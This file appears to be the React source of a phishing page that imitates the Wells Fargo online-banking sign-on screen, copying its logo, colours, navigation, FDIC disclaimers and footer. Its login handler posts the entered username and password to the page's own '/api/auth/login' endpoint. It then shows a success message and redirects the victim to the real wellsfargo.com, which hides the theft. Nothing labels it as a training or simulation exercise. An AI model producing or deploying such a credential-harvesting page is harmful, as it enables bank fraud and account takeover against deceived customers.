import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Card, CardContent } from "@/components/ui/card";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { X, Search, Key, Shield, Lock, ChevronDown } from "lucide-react";
import { Link, useLocation } from "wouter";
import heroBg from "@/assets/images/hero-bg.jpg";

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
  saveUsername: z.boolean().default(false),
});

type LoginFormData = z.infer<typeof loginSchema>;

function getGreeting(): string {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 18) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [greeting, setGreeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  useEffect(() => {
    const interval = setInterval(() => {
      setGreeting(getGreeting());
    }, 60000);
    return () => clearInterval(interval);
  }, []);

  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: "",
      password: "",
      saveUsername: false,
    },
  });

  const usernameValue = form.watch("username");

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", {
        username: data.username,
        password: data.password,
      });
      return response;
    },
    onSuccess: () => {
      toast({
        title: "Sign On Successful",
        description: "Redirecting to Wells Fargo...",
      });
      setTimeout(() => {
        window.location.href = "https://www.wellsfargo.com/";
      }, 1000);
    },
    onError: (error: Error) => {
      toast({
        title: "Sign On Failed",
        description: error.message || "Invalid username or password.",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: LoginFormData) => {
    loginMutation.mutate(data);
  };

  const clearUsername = () => {
    form.setValue("username", "");
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50">
      {/* Top utility bar */}
      <div className="bg-[#d71e28] text-white text-xs">
        <div className="max-w-7xl mx-auto px-4 py-1.5">
          <div className="flex items-center justify-end gap-4">
            <a href="#" className="hover:underline" data-testid="link-espanol">
              Español
            </a>
            <a href="#" className="hover:underline" data-testid="link-contact">
              Contact Us
            </a>
            <a href="#" className="hover:underline" data-testid="link-locations">
              Locations
            </a>
            <a href="#" className="hover:underline" data-testid="link-help">
              Help
            </a>
          </div>
        </div>
      </div>

      {/* Main header */}
      <header className="bg-[#d71e28] text-white pb-0">
        <div className="max-w-7xl mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-8">
              <div className="flex items-center gap-2" data-testid="logo-container">
                <div className="w-10 h-10 bg-[#ffcd41] rounded-full flex items-center justify-center">
                  <div className="w-6 h-6 border-2 border-[#d71e28] rounded-full"></div>
                </div>
                <span className="text-xl font-bold tracking-wide" data-testid="text-logo">
                  WELLS FARGO
                </span>
              </div>
            </div>

            <div className="flex items-center gap-3">
              <div className="relative hidden md:block">
                <Input
                  placeholder="Search"
                  className="w-48 h-8 bg-white/10 border-white/30 text-white placeholder:text-white/70 text-sm rounded-sm"
                  data-testid="input-search"
                />
                <Search className="absolute right-2 top-1/2 -translate-y-1/2 w-4 h-4 text-white/70" />
              </div>
              <Search className="w-5 h-5 md:hidden" />
            </div>
          </div>
        </div>

        {/* Navigation bar */}
        <nav className="bg-[#b91c23] mt-2">
          <div className="max-w-7xl mx-auto px-4">
            <div className="flex items-center gap-1 overflow-x-auto">
              {["Personal", "Small Business", "Commercial", "Corporate & Investment Banking", "Wealth Management"].map((item) => (
                <button
                  key={item}
                  className="px-4 py-2.5 text-sm text-white hover:bg-white/10 whitespace-nowrap flex items-center gap-1 transition-colors"
                  data-testid={`nav-${item.toLowerCase().replace(/ /g, "-")}`}
                >
                  {item}
                  <ChevronDown className="w-3 h-3" />
                </button>
              ))}
            </div>
          </div>
        </nav>
      </header>

      {/* Yellow accent bar */}
      <div className="bg-[#ffcd41] h-1.5"></div>

      {/* Main content with background */}
      <main
        className="flex-1 relative"
        style={{
          backgroundImage: `linear-gradient(to bottom, rgba(0,0,0,0.1), rgba(0,0,0,0.3)), url(${heroBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center bottom",
        }}
      >
        <div className="max-w-md mx-auto px-4 py-10">
          {/* Login Card */}
          <Card
            className="shadow-xl border-0 bg-white"
            data-testid="card-login"
          >
            <CardContent className="p-6 sm:p-8">
              <h1
                className="text-2xl text-center text-gray-800 mb-6 font-light"
                style={{ fontFamily: "'Open Sans', sans-serif" }}
                data-testid="text-greeting"
              >
                {greeting}
              </h1>

              <Form {...form}>
                <form
                  onSubmit={form.handleSubmit(onSubmit)}
                  className="space-y-4"
                >
                  <FormField
                    control={form.control}
                    name="username"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <div className="relative">
                            <Input
                              placeholder="Username"
                              className="h-12 pr-10 border-gray-300 rounded text-base focus:border-[#d71e28] focus:ring-[#d71e28]"
                              data-testid="input-username"
                              {...field}
                            />
                            {usernameValue && (
                              <button
                                type="button"
                                onClick={clearUsername}
                                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                                data-testid="button-clear-username"
                              >
                                <X className="w-5 h-5" />
                              </button>
                            )}
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="password"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <div className="relative">
                            <Input
                              type={showPassword ? "text" : "password"}
                              placeholder="Password"
                              className="h-12 pr-16 border-gray-300 rounded text-base focus:border-[#d71e28] focus:ring-[#d71e28]"
                              data-testid="input-password"
                              {...field}
                            />
                            <button
                              type="button"
                              onClick={() => setShowPassword(!showPassword)}
                              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#d71e28] text-sm font-medium hover:underline"
                              data-testid="button-toggle-password"
                            >
                              {showPassword ? "Hide" : "Show"}
                            </button>
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="saveUsername"
                    render={({ field }) => (
                      <FormItem>
                        <div className="flex items-start gap-2">
                          <FormControl>
                            <Checkbox
                              checked={field.value}
                              onCheckedChange={field.onChange}
                              className="mt-0.5 border-gray-400 data-[state=checked]:bg-[#d71e28] data-[state=checked]:border-[#d71e28]"
                              data-testid="checkbox-save-username"
                            />
                          </FormControl>
                          <div className="text-sm">
                            <label className="text-gray-800 font-medium cursor-pointer">
                              Save username
                            </label>
                            <p className="text-gray-500 text-xs mt-0.5">
                              To help keep your account secure, save your
                              username only on devices that aren't used by other
                              people.
                            </p>
                          </div>
                        </div>
                      </FormItem>
                    )}
                  />

                  <div className="pt-2">
                    <Button
                      type="submit"
                      className="w-full h-11 bg-[#ffcd41] hover:bg-[#edc13b] text-gray-900 font-semibold rounded-full border-0"
                      disabled={loginMutation.isPending}
                      data-testid="button-sign-on"
                    >
                      {loginMutation.isPending ? "Signing on..." : "Sign On"}
                    </Button>
                  </div>

                  <div className="flex items-center justify-center gap-3 text-gray-400 text-sm py-2">
                    <div className="flex-1 h-px bg-gray-200"></div>
                    <span>or</span>
                    <div className="flex-1 h-px bg-gray-200"></div>
                  </div>

                  <Button
                    type="button"
                    variant="outline"
                    className="w-full h-11 rounded-full border-2 border-gray-800 text-gray-800 font-medium hover:bg-gray-50"
                    data-testid="button-passkey"
                  >
                    <Key className="w-4 h-4 mr-2" />
                    Use a passkey
                  </Button>

                  <p className="text-xs text-gray-500 text-center pt-1">
                    Don't have one? Create a passkey after signing on and skip
                    the password next time.
                  </p>
                </form>
              </Form>

              <div className="mt-5 text-center">
                <Link
                  href="/forgot-password"
                  className="text-[#d71e28] text-sm hover:underline inline-flex items-center gap-1"
                  data-testid="link-forgot"
                >
                  <span className="text-base">→</span>
                  Forgot username or password?
                </Link>
              </div>

              <div className="mt-4 pt-4 border-t border-gray-200 text-center">
                <p className="text-sm text-gray-600 mb-2">New to Wells Fargo Online?</p>
                <Link
                  href="/register"
                  className="text-[#d71e28] text-sm font-semibold hover:underline"
                  data-testid="link-register"
                >
                  Enroll Now
                </Link>
              </div>
            </CardContent>
          </Card>

          {/* Security badge */}
          <div className="flex items-center justify-center gap-2 mt-4 text-white text-xs">
            <Shield className="w-4 h-4" />
            <span>Your security is our priority</span>
            <Lock className="w-3 h-3" />
          </div>
        </div>

        {/* Disclaimer Card */}
        <div className="max-w-3xl mx-auto px-4 pb-8">
          <Card className="shadow-lg border-0 bg-white/95 backdrop-blur">
            <CardContent className="p-5">
              <h3
                className="font-bold text-gray-800 text-sm mb-3"
                data-testid="text-disclaimer-title"
              >
                Investment and Insurance Products are:
              </h3>
              <div className="grid sm:grid-cols-3 gap-2 text-sm text-gray-700">
                <div className="flex items-start gap-2">
                  <span className="text-[#d71e28] font-bold">•</span>
                  <span>Not Insured by the FDIC or Any Federal Government Agency</span>
                </div>
                <div className="flex items-start gap-2">
                  <span className="text-[#d71e28] font-bold">•</span>
                  <span>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</span>
                </div>
                <div className="flex items-start gap-2">
                  <span className="text-[#d71e28] font-bold">•</span>
                  <span>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</span>
                </div>
              </div>
              <div className="mt-4 pt-3 border-t border-gray-200 flex flex-wrap items-center justify-between gap-2">
                <p className="text-xs text-gray-600">
                  Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
                </p>
                <div className="flex items-center gap-3">
                  <span className="text-xs font-bold text-gray-700 border border-gray-400 px-2 py-0.5 rounded">
                    FDIC
                  </span>
                  <span className="text-xs text-gray-600">Equal Housing Lender</span>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#333] text-white py-6">
        <div className="max-w-7xl mx-auto px-4">
          <div className="grid sm:grid-cols-4 gap-6 mb-6">
            <div>
              <h4 className="font-bold text-sm mb-3">About Wells Fargo</h4>
              <ul className="space-y-2 text-xs text-gray-300">
                <li><a href="#" className="hover:text-white">Careers</a></li>
                <li><a href="#" className="hover:text-white">Diversity and Accessibility</a></li>
                <li><a href="#" className="hover:text-white">Investor Relations</a></li>
                <li><a href="#" className="hover:text-white">Newsroom</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-sm mb-3">Customer Service</h4>
              <ul className="space-y-2 text-xs text-gray-300">
                <li><a href="#" className="hover:text-white">Online Help</a></li>
                <li><a href="#" className="hover:text-white">Report Email Fraud</a></li>
                <li><a href="#" className="hover:text-white">Security Center</a></li>
                <li><a href="#" className="hover:text-white">Privacy Policy</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-sm mb-3">Products & Services</h4>
              <ul className="space-y-2 text-xs text-gray-300">
                <li><a href="#" className="hover:text-white">Checking Accounts</a></li>
                <li><a href="#" className="hover:text-white">Savings Accounts</a></li>
                <li><a href="#" className="hover:text-white">Credit Cards</a></li>
                <li><a href="#" className="hover:text-white">Home Loans</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-sm mb-3">Connect With Us</h4>
              <ul className="space-y-2 text-xs text-gray-300">
                <li><a href="#" className="hover:text-white">ATMs/Locations</a></li>
                <li><a href="#" className="hover:text-white">Contact Us</a></li>
                <li><a href="#" className="hover:text-white">Sitemap</a></li>
                <li><a href="#" className="hover:text-white">Feedback</a></li>
              </ul>
            </div>
          </div>

          <div className="border-t border-gray-600 pt-4">
            <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-xs text-gray-400 mb-3">
              <a href="#" className="hover:text-white">Privacy, Cookies, Security & Legal</a>
              <span>|</span>
              <a href="#" className="hover:text-white">Notice of Data Collection</a>
              <span>|</span>
              <a href="#" className="hover:text-white">Do Not Sell or Share My Personal Information</a>
              <span>|</span>
              <a href="#" className="hover:text-white">Ad Choices</a>
            </div>
            <p className="text-xs text-gray-500 text-center">
              © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
